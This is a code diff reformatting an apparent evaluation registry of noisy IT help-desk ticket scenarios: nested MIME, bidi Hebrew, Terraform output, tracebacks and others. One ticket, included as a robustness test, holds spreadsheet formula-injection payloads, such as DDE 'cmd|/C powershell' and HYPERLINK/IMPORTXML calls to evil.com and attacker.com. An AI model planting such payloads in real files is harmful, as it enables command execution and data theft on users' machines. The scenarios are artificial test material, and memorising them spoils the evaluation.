@@ -7361,9 +7361,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-132",
         name="Unicode normalization mismatch in file paths",
-        description=(
-            "File paths contain pre-composed vs decomposed Unicode causing sync failures."
-        ),
+        description=("File paths contain pre-composed vs decomposed Unicode causing sync failures."),
         category=_CATEGORY,
         tags=["unicode_normalization", "nfd_mismatch", "path_encoding"],
         ticket=EvalTicket(
@@ -7453,8 +7451,7 @@ default_registry.register(
         scenario_id="dc-134",
         name="Deep MIME boundary nesting in forwarded email",
         description=(
-            "Email forwarded many times with nested MIME boundaries "
-            "creating a deeply nested multipart structure."
+            "Email forwarded many times with nested MIME boundaries creating a deeply nested multipart structure."
         ),
         category=_CATEGORY,
         tags=["deep_mime", "boundary_nesting", "email_parsing"],
@@ -7462,25 +7459,25 @@ default_registry.register(
             ticket_id="INC-5134",
             subject="Cannot open email attachments - parsing error",
             description=(
-                "Content-Type: multipart/mixed; boundary=\"----=_Part_001\"\n"
+                'Content-Type: multipart/mixed; boundary="----=_Part_001"\n'
                 "------=_Part_001\n"
-                "Content-Type: multipart/alternative; boundary=\"----=_Part_002\"\n"
+                'Content-Type: multipart/alternative; boundary="----=_Part_002"\n'
                 "------=_Part_002\n"
-                "Content-Type: multipart/related; boundary=\"----=_Part_003\"\n"
+                'Content-Type: multipart/related; boundary="----=_Part_003"\n'
                 "------=_Part_003\n"
-                "Content-Type: multipart/mixed; boundary=\"----=_Part_004\"\n"
+                'Content-Type: multipart/mixed; boundary="----=_Part_004"\n'
                 "------=_Part_004\n"
-                "Content-Type: multipart/alternative; boundary=\"----=_Part_005\"\n"
+                'Content-Type: multipart/alternative; boundary="----=_Part_005"\n'
                 "------=_Part_005\n"
-                "Content-Type: multipart/mixed; boundary=\"----=_Part_006\"\n"
+                'Content-Type: multipart/mixed; boundary="----=_Part_006"\n'
                 "------=_Part_006\n"
-                "Content-Type: multipart/related; boundary=\"----=_Part_007\"\n"
+                'Content-Type: multipart/related; boundary="----=_Part_007"\n'
                 "------=_Part_007\n"
-                "Content-Type: multipart/mixed; boundary=\"----=_Part_008\"\n"
+                'Content-Type: multipart/mixed; boundary="----=_Part_008"\n'
                 "------=_Part_008\n"
-                "Content-Type: multipart/mixed; boundary=\"----=_Part_009\"\n"
+                'Content-Type: multipart/mixed; boundary="----=_Part_009"\n'
                 "------=_Part_009\n"
-                "Content-Type: multipart/mixed; boundary=\"----=_Part_010\"\n"
+                'Content-Type: multipart/mixed; boundary="----=_Part_010"\n'
                 "------=_Part_010\n"
                 "Content-Type: text/plain; charset=utf-8\n\n"
                 "ACTUAL ISSUE: I cannot open any email attachments in Outlook. "
@@ -7524,12 +7521,12 @@ default_registry.register(
                 "Hi, Excel crashes every time I open the Q1 report. "
                 "Here is sample data from the file:\n\n"
                 "Name\tAmount\tFormula\n"
-                "=HYPERLINK(\"http://evil.com\",\"Revenue\")\t$1,200,000\t=SUM(B2:B10)\n"
-                "=CMD(\"/C calc\")\t$890,000\t=SUM(B3:B11)\n"
-                "+cmd|\'/C notepad\'!A0\t$450,000\t=AVERAGE(B2:B5)\n"
-                "-2+1+cmd|\'/C powershell\'!A0\t$320,000\t=MAX(B2:B8)\n"
+                '=HYPERLINK("http://evil.com","Revenue")\t$1,200,000\t=SUM(B2:B10)\n'
+                '=CMD("/C calc")\t$890,000\t=SUM(B3:B11)\n'
+                "+cmd|'/C notepad'!A0\t$450,000\t=AVERAGE(B2:B5)\n"
+                "-2+1+cmd|'/C powershell'!A0\t$320,000\t=MAX(B2:B8)\n"
                 "@SUM(A1:A10)\t$1,100,000\t=MIN(B2:B8)\n"
-                "=IMPORTXML(\"http://attacker.com/data\",\"//a\")\t$670,000\t=COUNT(B:B)\n\n"
+                '=IMPORTXML("http://attacker.com/data","//a")\t$670,000\t=COUNT(B:B)\n\n'
                 "The file is 45MB and contains about 200 sheets. Excel version "
                 "is Microsoft 365 (Build 18025.20160). It crashes with an "
                 "unhandled exception after about 30 seconds of loading.\n\n"
@@ -7602,16 +7599,13 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-137",
         name="Mixed bidi text — Hebrew and English interleaved",
-        description=(
-            "Hebrew complaint with English technical terms and bidi control characters."
-        ),
+        description=("Hebrew complaint with English technical terms and bidi control characters."),
         category=_CATEGORY,
         tags=["bidi_hebrew", "rtl_control", "mixed_direction"],
         ticket=EvalTicket(
             ticket_id="INC-5137",
             subject=(
-                "\u200f\u05de\u05d3\u05e4\u05e1\u05ea \u200eLaserJet\u200f"
-                " \u05dc\u05d0 \u05e2\u05d5\u05d1\u05d3\u05ea"
+                "\u200f\u05de\u05d3\u05e4\u05e1\u05ea \u200eLaserJet\u200f \u05dc\u05d0 \u05e2\u05d5\u05d1\u05d3\u05ea"
             ),
             description=(
                 "\u200f\u05e9\u05dc\u05d5\u05dd \u05e6\u05d5\u05d5\u05ea IT,\n\n"
@@ -7704,9 +7698,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-139",
         name="Terraform plan output — infrastructure provisioning failure",
-        description=(
-            "User pasted large Terraform plan output with resource changes."
-        ),
+        description=("User pasted large Terraform plan output with resource changes."),
         category=_CATEGORY,
         tags=["terraform_plan", "iac_diff", "infrastructure"],
         ticket=EvalTicket(
@@ -7718,22 +7710,22 @@ default_registry.register(
                 "Initializing provider plugins...\n"
                 "Planning...\n\n"
                 "  # azurerm_resource_group.main will be created\n"
-                "  + resource \"azurerm_resource_group\" \"main\" {\n"
+                '  + resource "azurerm_resource_group" "main" {\n'
                 "      + id       = (known after apply)\n"
-                "      + location = \"eastus2\"\n"
-                "      + name     = \"rg-contoso-prod-eastus2\"\n"
+                '      + location = "eastus2"\n'
+                '      + name     = "rg-contoso-prod-eastus2"\n'
                 "    }\n\n"
                 "  # azurerm_kubernetes_cluster.aks will be updated in-place\n"
-                "  ~ resource \"azurerm_kubernetes_cluster\" \"aks\" {\n"
+                '  ~ resource "azurerm_kubernetes_cluster" "aks" {\n'
                 "      ~ default_node_pool {\n"
-                "          ~ vm_size    = \"Standard_D4s_v3\" -> \"Standard_D8s_v3\"\n"
+                '          ~ vm_size    = "Standard_D4s_v3" -> "Standard_D8s_v3"\n'
                 "          ~ node_count = 3 -> 5\n"
                 "        }\n"
                 "    }\n\n"
                 "  # azurerm_sql_server.main will be destroyed\n"
-                "  - resource \"azurerm_sql_server\" \"main\" {\n"
-                "      - name     = \"sql-contoso-prod\" -> null\n"
-                "      - location = \"eastus2\" -> null\n"
+                '  - resource "azurerm_sql_server" "main" {\n'
+                '      - name     = "sql-contoso-prod" -> null\n'
+                '      - location = "eastus2" -> null\n'
                 "    }\n\n"
                 "Error: creating AKS Cluster: unexpected status 403 Forbidden\n"
                 "  Subscription quota exceeded for Standard_D8s_v3 in eastus2.\n\n"
@@ -7761,9 +7753,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-140",
         name="GraphQL introspection response paste",
-        description=(
-            "User pasted a full GraphQL __schema introspection JSON response."
-        ),
+        description=("User pasted a full GraphQL __schema introspection JSON response."),
         category=_CATEGORY,
         tags=["graphql_dump", "api_noise", "json_schema"],
         ticket=EvalTicket(
@@ -7812,9 +7802,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-141",
         name="PGP-signed email with armor blocks",
-        description=(
-            "Message wrapped in PGP SIGNED MESSAGE armor blocks."
-        ),
+        description=("Message wrapped in PGP SIGNED MESSAGE armor blocks."),
         category=_CATEGORY,
         tags=["pgp_armor", "signed_email", "encryption_artifact"],
         ticket=EvalTicket(
@@ -7864,10 +7852,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-142",
         name="Teams/Slack chat transcript with reactions",
-        description=(
-            "Copy-pasted chat conversation with emoji reactions, "
-            "@mentions, and thread timestamps."
-        ),
+        description=("Copy-pasted chat conversation with emoji reactions, @mentions, and thread timestamps."),
         category=_CATEGORY,
         tags=["chat_reactions", "emoji_transcript", "teams_paste"],
         ticket=EvalTicket(
@@ -7875,13 +7860,13 @@ default_registry.register(
             subject="Teams not loading channels - copying chat here",
             description=(
                 "Teams is broken so I am pasting our team chat here:\n\n"
-                "[09:14] @jennifer.wu: Hey has anyone else\'s Teams stopped loading? \U0001f914\n"
-                "[09:14] @mark.torres: Same here \U0001f44e Channels won\'t load\n"
+                "[09:14] @jennifer.wu: Hey has anyone else's Teams stopped loading? \U0001f914\n"
+                "[09:14] @mark.torres: Same here \U0001f44e Channels won't load\n"
                 "[09:15] @jennifer.wu: \U0001f44d\U0001f44d\U0001f44d\n"
-                "[09:15] @sarah.patel: +1, getting \'Something went wrong\' error \U0001f62d\n"
+                "[09:15] @sarah.patel: +1, getting 'Something went wrong' error \U0001f62d\n"
                 "   \U0001f44d 7  \u2764\ufe0f 3  \U0001f62e 2\n"
                 "[09:16] @mark.torres: I cleared cache (AppData/Microsoft/Teams) "
-                "and it still doesn\'t work\n"
+                "and it still doesn't work\n"
                 "[09:17] @jennifer.wu: Same, tried reinstalling too \U0001f937\u200d\u2640\ufe0f\n"
                 "[09:18] @sarah.patel: The web version teams.microsoft.com works "
                 "fine though \U0001f914\n"
@@ -7912,9 +7897,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-143",
         name="Windows Event Viewer XML export — BSOD crashes",
-        description=(
-            "Raw XML from Windows Event Viewer pasted into ticket description."
-        ),
+        description=("Raw XML from Windows Event Viewer pasted into ticket description."),
         category=_CATEGORY,
         tags=["event_xml", "bsod_dump", "windows_crash"],
         ticket=EvalTicket(
@@ -7922,21 +7905,21 @@ default_registry.register(
             subject="Laptop blue screens multiple times per day",
             description=(
                 "My laptop keeps crashing with BSOD. Here are the Event Viewer logs:\n\n"
-                "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n"
+                '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
                 "  <System>\n"
-                "    <Provider Name=\"Microsoft-Windows-WER-SystemErrorReporting\"/>\n"
+                '    <Provider Name="Microsoft-Windows-WER-SystemErrorReporting"/>\n'
                 "    <EventID>1001</EventID>\n"
                 "    <Level>2</Level>\n"
-                "    <TimeCreated SystemTime=\"2026-03-18T06:32:15.000Z\"/>\n"
+                '    <TimeCreated SystemTime="2026-03-18T06:32:15.000Z"/>\n'
                 "    <Computer>WS-CONTOSO-4521</Computer>\n"
                 "  </System>\n"
                 "  <EventData>\n"
-                "    <Data Name=\"BugCheckCode\">0x0000003B</Data>\n"
-                "    <Data Name=\"BugCheckParameter1\">0x00000000c0000005</Data>\n"
-                "    <Data Name=\"BugCheckParameter2\">0xfffff80742a61234</Data>\n"
-                "    <Data Name=\"DumpFileSize\">1073741824</Data>\n"
-                "    <Data Name=\"FaultModule\">ntoskrnl.exe</Data>\n"
-                "    <Data Name=\"FaultModuleVersion\">10.0.22631.3296</Data>\n"
+                '    <Data Name="BugCheckCode">0x0000003B</Data>\n'
+                '    <Data Name="BugCheckParameter1">0x00000000c0000005</Data>\n'
+                '    <Data Name="BugCheckParameter2">0xfffff80742a61234</Data>\n'
+                '    <Data Name="DumpFileSize">1073741824</Data>\n'
+                '    <Data Name="FaultModule">ntoskrnl.exe</Data>\n'
+                '    <Data Name="FaultModuleVersion">10.0.22631.3296</Data>\n'
                 "  </EventData>\n"
                 "</Event>\n\n"
                 "BugCheck 0x3B: SYSTEM_SERVICE_EXCEPTION in ntoskrnl.exe. Happens "
@@ -7964,9 +7947,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-144",
         name="Docker compose YAML + container logs interleaved",
-        description=(
-            "Docker compose file mixed with docker logs output from failing containers."
-        ),
+        description=("Docker compose file mixed with docker logs output from failing containers."),
         category=_CATEGORY,
         tags=["docker_interleaved", "compose_logs", "container_debug"],
         ticket=EvalTicket(
@@ -7976,14 +7957,14 @@ default_registry.register(
                 "The order-processing service keeps failing. Here is our compose "
                 "and the logs:\n\n"
                 "# docker-compose.yml\n"
-                "version: \'3.8\'\n"
+                "version: '3.8'\n"
                 "services:\n"
                 "  order-processor:\n"
                 "    image: contoso.azurecr.io/order-processor:3.2.1\n"
                 "    ports:\n"
-                "      - \'8080:8080\'\n"
+                "      - '8080:8080'\n"
                 "    healthcheck:\n"
-                "      test: [\'CMD\', \'curl\', \'-f\', \'http://localhost:8080/health\']\n"
+                "      test: ['CMD', 'curl', '-f', 'http://localhost:8080/health']\n"
                 "      interval: 30s\n"
                 "      retries: 3\n\n"
                 "$ docker logs order-processor --tail 20\n"
@@ -8016,9 +7997,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-145",
         name="S/MIME encrypted email body artifact",
-        description=(
-            "Ticket body contains S/MIME ContentType headers and base64 encrypted blocks."
-        ),
+        description=("Ticket body contains S/MIME ContentType headers and base64 encrypted blocks."),
         category=_CATEGORY,
         tags=["smime_body", "encrypted_artifact", "email_security"],
         ticket=EvalTicket(
@@ -8027,10 +8006,10 @@ default_registry.register(
             description=(
                 "Content-Type: application/pkcs7-mime;\n"
                 "  smime-type=enveloped-data;\n"
-                "  name=\"smime.p7m\"\n"
+                '  name="smime.p7m"\n'
                 "Content-Transfer-Encoding: base64\n"
                 "Content-Disposition: attachment;\n"
-                "  filename=\"smime.p7m\"\n\n"
+                '  filename="smime.p7m"\n\n'
                 "MIIBygYJKoZIhvcNAQcDoIIBuzCCAbc"
                 "CAQAxggFhMIIBXQIBADBFMDExLzAtBgNV"
                 "BAMMJkNvbnRvc28gRmluYW5jaWFsIFNl"
@@ -8065,9 +8044,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-146",
         name="Azure ARM template JSON dump",
-        description=(
-            "User pasted a large ARM template JSON with resource definitions."
-        ),
+        description=("User pasted a large ARM template JSON with resource definitions."),
         category=_CATEGORY,
         tags=["arm_template", "azure_json", "infrastructure"],
         ticket=EvalTicket(
@@ -8083,19 +8060,19 @@ default_registry.register(
                 '{"type":"Microsoft.Compute/virtualMachines",'
                 '"apiVersion":"2023-09-01",'
                 '"name":"vm-contoso-trade-01",'
-                "\"location\":\"[parameters('location')]\","
-                "\"properties\":{\"hardwareProfile\":{\"vmSize\":\"[parameters('vmSize')]\"},"
+                '"location":"[parameters(\'location\')]",'
+                '"properties":{"hardwareProfile":{"vmSize":"[parameters(\'vmSize\')]"},'
                 '"storageProfile":{"imageReference":{"publisher":"MicrosoftWindowsServer",'
                 '"offer":"WindowsServer","sku":"2022-datacenter-g2","version":"latest"}},'
                 '"osProfile":{"computerName":"trade-01","adminUsername":"contosoadmin"},'
-                "\"networkProfile\":{\"networkInterfaces\":[{\"id\":\"[resourceId("
+                '"networkProfile":{"networkInterfaces":[{"id":"[resourceId('
                 "'Microsoft.Network/networkInterfaces','nic-trade-01')]\"}]}}},"
                 '{"type":"Microsoft.Network/networkInterfaces",'
                 '"apiVersion":"2023-09-01",'
                 '"name":"nic-trade-01",'
-                "\"location\":\"[parameters('location')]\","
+                '"location":"[parameters(\'location\')]",'
                 '"properties":{"ipConfigurations":[{"name":"ipconfig1",'
-                "\"properties\":{\"subnet\":{\"id\":\"[resourceId("
+                '"properties":{"subnet":{"id":"[resourceId('
                 "'Microsoft.Network/virtualNetworks/subnets',"
                 "'vnet-contoso-prod','snet-compute')]\"}}}]}}]}\n\n"
                 "Error: InsufficientQuota - Subscription does not have enough "
@@ -8123,9 +8100,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-147",
         name="Python traceback with deep virtualenv paths",
-        description=(
-            "Full Python traceback with extremely long virtualenv paths."
-        ),
+        description=("Full Python traceback with extremely long virtualenv paths."),
         category=_CATEGORY,
         tags=["deep_traceback", "venv_paths", "python_crash"],
         ticket=EvalTicket(
@@ -8134,20 +8109,20 @@ default_registry.register(
             description=(
                 "The risk calculator crashes on startup. Full traceback:\n\n"
                 "Traceback (most recent call last):\n"
-                "  File \"/opt/contoso/apps/risk-engine/.venv/lib/python3.12/site-packages/"
-                "uvicorn/protocols/http/h11_impl.py\", line 404, in run_asgi\n"
+                '  File "/opt/contoso/apps/risk-engine/.venv/lib/python3.12/site-packages/'
+                'uvicorn/protocols/http/h11_impl.py", line 404, in run_asgi\n'
                 "    result = await app(scope, receive, send)\n"
-                "  File \"/opt/contoso/apps/risk-engine/.venv/lib/python3.12/site-packages/"
-                "starlette/applications.py\", line 123, in __call__\n"
+                '  File "/opt/contoso/apps/risk-engine/.venv/lib/python3.12/site-packages/'
+                'starlette/applications.py", line 123, in __call__\n'
                 "    await self.middleware_stack(scope, receive, send)\n"
-                "  File \"/opt/contoso/apps/risk-engine/.venv/lib/python3.12/site-packages/"
-                "starlette/middleware/errors.py\", line 186, in __call__\n"
+                '  File "/opt/contoso/apps/risk-engine/.venv/lib/python3.12/site-packages/'
+                'starlette/middleware/errors.py", line 186, in __call__\n'
                 "    raise exc\n"
-                "  File \"/opt/contoso/apps/risk-engine/src/contoso/risk/engine/core/"
-                "portfolio_calculator.py\", line 247, in calculate_var\n"
+                '  File "/opt/contoso/apps/risk-engine/src/contoso/risk/engine/core/'
+                'portfolio_calculator.py", line 247, in calculate_var\n'
                 "    return self._monte_carlo_simulation(positions, confidence)\n"
-                "  File \"/opt/contoso/apps/risk-engine/src/contoso/risk/engine/core/"
-                "simulation.py\", line 89, in _monte_carlo_simulation\n"
+                '  File "/opt/contoso/apps/risk-engine/src/contoso/risk/engine/core/'
+                'simulation.py", line 89, in _monte_carlo_simulation\n'
                 "    cov_matrix = np.cov(returns_matrix, rowvar=False)\n"
                 "numpy.linalg.LinAlgError: Singular matrix\n\n"
                 "The tool uses Python 3.12.2, numpy 1.26.4, on RHEL 9.\n\n"
@@ -8173,9 +8148,7 @@ default_registry.register(
     EvalScenario(
         scenario_id="dc-148",
         name="Jira notification template noise",
-        description=(
-            "Full Jira notification email with headers, status history, and custom fields."
-        ),
+        description=("Full Jira notification email with headers, status history, and custom fields."),
         category=_CATEGORY,
         tags=["jira_notification", "template_noise", "status_history"],
         ticket=EvalTicket(
@@ -8231,8 +8204,7 @@ default_registry.register(
         scenario_id="dc-149",
         name="Auto-translated ticket with translation artifacts",
         description=(
-            "Machine-translated text with [Translated from Japanese] markers "
-            "and awkward machine translation phrasing."
+            "Machine-translated text with [Translated from Japanese] markers and awkward machine translation phrasing."
         ),
         category=_CATEGORY,
         tags=["auto_translated", "translation_markers", "japanese_english"],
